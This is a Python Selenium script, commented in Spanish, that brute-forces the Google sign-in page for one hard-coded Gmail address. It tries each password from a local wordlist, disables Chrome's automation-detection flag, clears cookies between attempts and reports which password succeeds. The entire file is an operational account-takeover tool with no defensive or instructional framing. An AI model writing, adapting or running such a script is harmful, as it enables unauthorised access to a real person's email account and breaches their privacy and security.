import time
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from selenium.webdriver.chrome.service import Service
from tqdm import tqdm  # Para la barra de progreso
from colorama import Fore, init  # Para colores en la consola

# Inicializar colorama
init(autoreset=True)

# Título del script en ASCII
print(Fore.CYAN + r"""
.___                             .__             .__                             .__       .__   
|   | ____    ____   ____   ____ |__| ___________|__|____      __________   ____ |__|____  |  |  
|   |/    \  / ___\_/ __ \ /    \|  |/ __ \_  __ \  \__  \    /  ___/  _ \_/ ___\|  \__  \ |  |  
|   |   |  \/ /_/  >  ___/|   |  \  \  ___/|  | \/  |/ __ \_  \___ (  <_> )  \___|  |/ __ \|  |__
|___|___|  /\___  / \___  >___|  /__|\___  >__|  |__(____  / /____  >____/ \___  >__(____  /____/
         \//_____/      \/     \/        \/              \/       \/           \/        \/      
""" + Fore.RESET)

# Configuración del navegador
options = webdriver.ChromeOptions()
options.add_argument('--disable-logging')  # Deshabilitar logs innecesarios
options.add_argument('--disable-blink-features=AutomationControlled')  # Evitar detección de automatización
options.add_argument('--start-maximized')  # Maximizar la ventana del navegador
# options.add_argument('--headless')  # Ejecutar en segundo plano (opcional)

# Ruta relativa al chromedriver
chromedriver_path = os.path.join(os.path.dirname(__file__), 'chromedriver', 'chromedriver.exe')

# Usar la clase Service para especificar la ruta del chromedriver
service = Service(chromedriver_path)

# Inicializar el navegador con la ruta especificada
driver = webdriver.Chrome(service=service, options=options)

# Solicitar el usuario
usuario = "wickj524@gmail.com"

# Ruta al archivo de contraseñas
password_file = os.path.join(os.path.dirname(__file__), 'password.list')

# Verificar si el archivo de contraseñas existe
if not os.path.isfile(password_file):
    print(Fore.RED + f"Error: El archivo {password_file} no existe." + Fore.RESET)
    driver.quit()
    exit()

# Leer las contraseñas del archivo
with open(password_file, 'r') as file:
    passwords = file.read().splitlines()

# Probar cada contraseña
for password in tqdm(passwords, desc="Probando contraseñas", unit=" contraseña"):
    try:
        # Abrir la página web
        driver.get('https://accounts.google.com/signin')

        # Esperar a que el campo de correo electrónico esté disponible
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.TAG_NAME, 'form'))
        )

        # Insertar datos en el campo de correo electrónico
        nombre = driver.find_element(By.NAME, 'identifier')
        nombre.send_keys(usuario)
        
        # Botón de siguiente
        submit_button_next = driver.find_element(By.XPATH, '//*[@id="identifierNext"]/div/button')
        submit_button_next.click()

        # Esperar a que el campo de contraseña esté disponible
        WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, 'Passwd'))
        )
        email = driver.find_element(By.NAME, 'Passwd')
        email.send_keys(password)

        # Enviar el formulario
        submit_button_enter = driver.find_element(By.XPATH, '//*[@id="passwordNext"]/div/button')
        submit_button_enter.click()

        # Esperar a que la página responda
        time.sleep(5)  # Esperar un momento para que la página cargue
        message_successfully = "Te damos la bienvenida,"
        # Verificar si la URL actual es la de Gmail
        if "https://mail.google.com/mail/u/0/#inbox" in driver.current_url or message_successfully in driver.page_source or "https://myaccount.google.com/?utm_source=sign_in_no_continue" in driver.current_url:
            print(Fore.GREEN + f"¡Éxito! La contraseña {password} es correcta." + Fore.RESET)
            break
        else:
            # Si no se cumple la condición, la contraseña es incorrecta
            raise TimeoutException

    except (NoSuchElementException, TimeoutException):
        # Si falla, mostrar en rojo
        print(Fore.RED + f"Fallo: La contraseña {password} no es correcta." + Fore.RESET)
    finally:
        # Limpiar cookies para la siguiente iteración
        driver.delete_all_cookies()

# Cerrar el navegador
driver.quit()